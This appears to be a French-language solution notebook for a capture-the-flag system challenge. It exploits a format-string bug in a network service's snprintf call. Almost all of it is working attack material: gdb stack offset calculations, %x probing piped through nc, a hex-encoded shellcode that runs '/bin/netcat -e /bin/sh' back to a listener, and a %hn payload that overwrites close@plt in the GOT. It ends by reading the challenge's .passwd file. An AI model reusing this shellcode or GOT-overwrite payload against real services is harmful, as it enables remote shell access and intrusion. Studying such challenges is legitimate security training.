Pas de format pour le snprintf

disas recv_loop
	[...]
	 	0x08048876 <+274>:	call   0x804a048 <close@plt>
		x48
		 python -c 'print "AAAA%x%x%x%x%x%x%x%x"' | nc localhost 56030
		 AAAA0010341414141782578257825782578257825
		 offset du buffer 5 octets

		 b snprintf
		 	0xb7e77890
			ret sprintf 0xB7E778C7
			n0x8048876 <recv_loop+274>:	call  0x804a048 <close@plt>

			x/4xw $esp
			0xbffff3dc:	0x08048841	0xbffff7fc	0x00000400	0xbffff3fc
			output = 0xbffff7fc
			taille = 0x400
			input = 0xbffff3fc

			prochain registre = 0xbffff7fc + 0x400 +0x4 = 0xBFFFFC00

			x/4xw $ebp
			0xbffffc18:	0xbffffc78	0x08048a61	0x00000007	0x00000005

			0xbffff3dc - 0xbffffc18 = 0x83C = 2092

			nbr de registre = 2092 / 4 = 527

			echo '0x%527$x' | nc localhost 56030
				0x5

				- offset du buffer
				echo '0x%524$x' | nc localhost 56030



				reverse bind shell code = "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x33\x31\x33\x31\x23\x90"
				trouvé sur "http://blog.csdn.net/wgwgnihao/article/details/45933359" ("/bin/netcat#-e#/bin/sh#127.000.000.001#9999")

				"\x48\xa0\x04\x08"

				printf "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x33\x31\x33\x31\x23\x90" | nc localhost 56031
				�<^1�F
				      �F�F�F&�F+�v,�^
					                       �^0�^�^4�^�^8�^'�^<�F@�
										                                               ��N,�V@̀����/bin/netcat#-e#/bin/sh#127.000.000.001#9999#�


																					   addresse de close
																					   0x804a048 = "\x48\xa0\x04\x08"

																					   lecture vers les nop
																					   "%62291x%5$hn%52203x%6$hn"


																					   nc -lvp 9999
																					   python -c 'print "\x48\xa0\x04\x08" + "\x4a\xa0\x04\x08" + "\x90" * 50 + "\xeb\x3c\x5e\x31\xc0\x88\x46\x0b\x88\x46\x0e\x88\x46\x16\x88\x46\x26\x88\x46\x2b\x89\x76\x2c\x8d\x5e\x0c\x89\x5e\x30\x8d\x5e\x0f\x89\x5e\x34\x8d\x5e\x17\x89\x5e\x38\x8d\x5e\x27\x89\x5e\x3c\x89\x46\x40\xb0\x0b\x89\xf3\x8d\x4e\x2c\x8d\x56\x40\xcd\x80\xe8\xbf\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x65\x74\x63\x61\x74\x23\x2d\x65\x23\x2f\x62\x69\x6e\x2f\x73\x68\x23\x31\x32\x37\x2e\x30\x30\x30\x2e\x30\x30\x30\x2e\x30\x30\x31\x23\x39\x39\x39\x39\x23" + 24 * "\x90" + "%62291x%5$hn%52203x%6$hn"' | nc localhost 56032

																					   cd challenge/app-systeme/ch32 && cat .passwd

